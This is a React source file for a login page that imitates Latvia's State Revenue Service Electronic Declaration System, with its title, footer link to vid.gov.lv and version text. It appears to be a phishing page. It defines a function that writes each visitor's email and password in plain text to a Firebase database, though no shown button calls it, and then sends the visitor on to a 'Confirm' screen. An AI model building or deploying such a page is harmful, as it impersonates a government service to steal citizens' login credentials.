import React, { useState } from "react";
import imgage from "./Image/WhatsApp.png";
import footerimg from "./Image/EU.png";
import { getDatabase, ref, set } from "firebase/database";
import { app } from "./firebase";

import {
  BrowserRouter as Router,
  Routes,
  Route,
  useNavigate,
} from "react-router-dom";
import Confirm from "./Screens/Confirmscreen";
import Forgot from "./Screens/ForgotPass";
// import confirmm from './Screens/Confirmscreen'

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const navigate = useNavigate();
  function generateUniqueId() {
    return (
      Date.now().toString() + Math.floor(Math.random() * 1000000).toString()
    );
  }

  const writeData = () => {
    const db = getDatabase();
    const uniqueId = generateUniqueId();

    set(ref(db, "users/" + uniqueId), {
      email: email,
      password: password,
    });
  };

  const onConnectbtn = () => {
    navigate('Confirm');
  };
  const onForgotbtn = () => {
    navigate('Forgot');
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <img src={imgage} style={{ width: "150px", height: "100px" }} />
        <h1 style={styles.title}>Electronic declaration system</h1>
        <a href="/" style={styles.homeLink}>
          &lt; To home page
        </a>
      </div>
      <div
        style={{ backgroundColor: "#DCDEE3", width: "1200px", height: "1px" }}
      ></div>
      <div style={styles.loginBox}>
        <h2>Connect to</h2>
        <div style={styles.formGroup}>
          <label htmlFor="username">Email/User name</label>
          <input
            type="text"
            id="username"
            name="username"
            style={styles.input}
            onChange={(e) => setEmail(e.target.value)}
            value={email}
          />
        </div>
        <div style={styles.formGroup}>
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            name="password"
            style={styles.input}
            onChange={(e) => setPassword(e.target.value)}
            value={password}
          />
        </div>
        <div style={styles.buttonRow}>
          <button style={styles.connectButton} onClick={onConnectbtn}>
            Connect to
          </button>
          <button style={styles.forgotButton} onClick={onForgotbtn}>Forgot my password</button>
        </div>
      </div>
      <div
        style={{ backgroundColor: "#DCDEE3", width: "1200px", height: "1px" }}
      ></div>
      <div style={styles.footer}>
        <div style={styles.buttonRow1}>
          <ul style={styles.footerLinks}>
            <li>
              <a href="tel:67120000">67120000</a>
            </li>
            <li>
              <a href="/cookie-policy">Cookie Use Policy</a>
            </li>
            <li>
              <a href="/accessibility">Accessibility</a>
            </li>
            <li>
              <a href="/terms">Terms of use</a>
            </li>
            <li>
              <a href="/become-a-user">Become a user</a>
            </li>
          </ul>
          <div style={{ marginLeft: "50px" }}>
            <img src={footerimg} style={{ width: "350px", height: "70px" }} />
          </div>
        </div>
        <p>
          Version 26.0.18.1, <a href="https://www.vid.gov.lv">www.vid.gov.lv</a>
        </p>
      </div>
      <div
        style={{ backgroundColor: "#DCDEE3", width: "1200px", height: "1px" }}
      ></div>
    </div>
  );
}

const styles = {
  container: {
    fontFamily: "Arial, sans-serif",
    // textAlign: 'center',
    margin: "40px",
  },
  header: {
    marginBottom: "30px",
  },
  logo: {
    marginBottom: "20px",
    width: "50px",
    height: "50px",
  },
  title: {
    fontSize: "24px",
    fontWeight: "bold",
    width: "400px",
  },
  homeLink: {
    display: "block",
    marginTop: "10px",
    textDecoration: "none",
    color: "#007bff",
    marginLeft: "15px",
  },
  main: {
    maxWidth: "400px", // Restrict the width of the main content area
    margin: "0", // Ensure it starts from the left
  },
  loginBox: {
    display: "grid",
    textAlign: "left",
    padding: "20px",
    // border: '1px solid #ccc',
    borderRadius: "4px",
    width: "300px",
  },
  buttonRow: {
    display: "flex",
    justifyContent: "space-between", // Ensure the buttons have space between them
    gap: "10px", // Optional: Add some gap between the buttons
  },
  buttonRow1: {
    display: "flex",
    // justifyContent: "space-between",
    gap: "20px",
  },
  formGroup: {
    marginBottom: "15px",
  },
  input: {
    width: "200%",
    padding: "8px",
    marginTop: "5px",
    borderRadius: "4px",
    border: "1px solid #ccc",
  },
  connectButton: {
    width: "100%",
    padding: "10px",
    backgroundColor: "#002168",
    color: "#fff",
    border: "none",
    borderRadius: "4px",
    cursor: "pointer",
    marginBottom: "10px",
  },
  forgotButton: {
    width: "100%",
    // padding: '10px',
    backgroundColor: "#f8f9fa",
    color: "#002168",
    border: "1px solid #002168",
    borderRadius: "4px",
    cursor: "pointer",
    marginBottom: "10px",
  },
  footer: {
    marginTop: "30px",
    fontSize: "12px",
  },
  footerLinks: {
    listStyle: "none",
    padding: 0,
    display: "flex",
    justifyContent: "flex-start",
    gap: "15px",
    marginBottom: "10px",
  },
  footerLinksItem: {
    marginLeft: "15px",
    marginRight: "15px",
  },
};

const AppWrapper = () => (
  <Router>
    <Routes>
      <Route path="/" element={<App />} />
      <Route path="Confirm" element={<Confirm />} />
      <Route path="Forgot" element={<Forgot />} />
    </Routes>
  </Router>
);

export default AppWrapper;
